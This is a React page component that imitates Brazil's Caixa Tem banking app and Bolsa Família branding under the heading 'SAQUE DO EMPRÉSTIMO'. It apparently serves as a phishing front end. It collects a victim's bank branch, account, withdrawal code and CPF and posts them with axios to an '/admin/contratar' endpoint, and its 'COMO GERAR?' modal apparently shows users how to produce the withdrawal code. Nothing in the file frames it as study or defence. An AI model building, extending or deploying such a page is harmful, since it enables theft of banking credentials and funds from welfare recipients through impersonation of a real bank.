import React, { useState } from "react";
import axios from "axios"; // Importar axios para fazer a requisição HTTP
import styles from './Inicio.module.css';

import logo from "../../Assets/img/logo.png";
import bandeira from "../../Assets/img/bandeira.png";
import caixaTemLogo from "../../Assets/img/caixatem.png";
import caixaTemLogoSelo from "../../Assets/img/selo-caixa-tem-v01.png";
import bolsaFamilia from "../../Assets/img/Bolsa-Familia-logo-rodape.png";
import imagemexemplo from "../../Assets/img/exemplo.png"; // Imagem a ser exibida no modal

function Inicio() {
    const [showModal, setShowModal] = useState(false);
    const [formData, setFormData] = useState({
        agencia: "",
        conta: "",
        codigoSaque: "",
        cpf: ""
    });
    const [mensagemErro, setMensagemErro] = useState(""); // Para armazenar a mensagem de erro

    const abrirModal = (e) => {
        e.preventDefault(); // Impede o envio do formulário
        setShowModal(true);
    };

    const fecharModal = () => {
        setShowModal(false);
    };

    const handleInputChange = (e) => {
        const { name, value } = e.target;
        setFormData({
            ...formData,
            [name]: value
        });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        try {
            // Enviar os dados para o backend
            const response = await axios.post("http://192.168.2.110:3000/admin/contratar", formData);

            if (response.data.status === "erro") {
                // Se o código de saque for inválido
                setMensagemErro("Código de saque inválido.");
            } else {
                // Sucesso: Redirecionar ou qualquer outra ação
                setMensagemErro(response.data.message);
            }
        } catch (error) {
            setMensagemErro("Erro ao tentar contratar o empréstimo.");
        }
    };

    return (
        <div className={styles.containerIndex}>
            {/* Bandeiras */}
            {[...Array(3)].map((_, idx) => (
                <img key={idx} className={styles.bandeira} src={bandeira} alt="bandeira" />
            ))}
            <header className={styles.header}>
                <img className={styles.logo} src={logo} alt="Logo" />
            </header>
            <main className={styles.containerMain}>
                <form action="#" method="post" className={styles.form} onSubmit={handleSubmit}>
                    <div className={styles.logoForm}>
                        <img src={caixaTemLogo} alt="Logo do Caixa Tem" />
                    </div>
                    <span className={styles.textSaque}>SAQUE DO EMPRÉSTIMO</span>
                    <h4 className={styles.textH4}>Informe os DADOS corretamente para continuar:</h4>

                    <div className={styles.inputsContainer}>
                        <div className={`${styles.inputGroup} ${styles.inputGroupAgencia}`}>
                            <input
                                name="agencia"
                                id="input_agencia"
                                className={styles.input}
                                type="text"
                                placeholder="AGÊNCIA"
                                maxLength={5}
                                required
                                value={formData.agencia}
                                onChange={handleInputChange}
                            />
                        </div>
                        <div className={`${styles.inputGroup} ${styles.inputGroupConta}`}>
                            <input
                                name="conta"
                                id="input_conta"
                                className={styles.input}
                                type="text"
                                placeholder="CONTA"
                                required
                                value={formData.conta}
                                onChange={handleInputChange}
                            />
                        </div>
                    </div>

                    <div className={styles.inputsContainer}>
                        <div className={`${styles.inputGroup} ${styles.inputGroupCodigoSaque}`}>
                            <input
                                name="codigoSaque"
                                id="input_codigoSaque"
                                className={styles.input}
                                type="text"
                                placeholder="CÓDIGO DE SAQUE"
                                required
                                value={formData.codigoSaque}
                                onChange={handleInputChange}
                            />
                        </div>
                        <div className={styles.buttonContainerShowImage}>
                            <button
                                className={styles.showImageButton}
                                onClick={abrirModal} // Abre o modal ao clicar
                            >
                                COMO GERAR?
                            </button>
                        </div>
                    </div>

                    <div className={styles.inputGroupCPF}>
                        <input
                            name="cpf"
                            id="input_cpf"
                            className={styles.input}
                            type="text"
                            placeholder="CPF"
                            required
                            value={formData.cpf}
                            onChange={handleInputChange}
                        />
                    </div>

                    {/* Exibir a mensagem de erro se houver */}
                    {mensagemErro && <p className={styles.mensagemErro}>{mensagemErro}</p>}

                    <div className={styles.containerButton}>
                        <button type="submit">CONTRATAR</button>
                    </div>
                </form>

                <div className={styles.selocaixa}>
                    <img src={caixaTemLogoSelo} alt="Selo Caixa Tem" />
                </div>
            </main>

            <footer className={styles.rodape}>
                <div className={styles.boxRodape}>
                    <img src={bolsaFamilia} alt="Bolsa Família" />
                </div>
            </footer>

            {/* MODAL */}
            {showModal && (
                <div className={styles.modalOverlay}>
                    <div className={styles.modalContent}>
                        <span className={styles.closeButton} onClick={fecharModal}>&times;</span>
                        <img src={imagemexemplo} alt="Imagem no Modal" className={styles.modalImage} />
                    </div>
                </div>
            )}
        </div>
    );
}

export default Inicio;
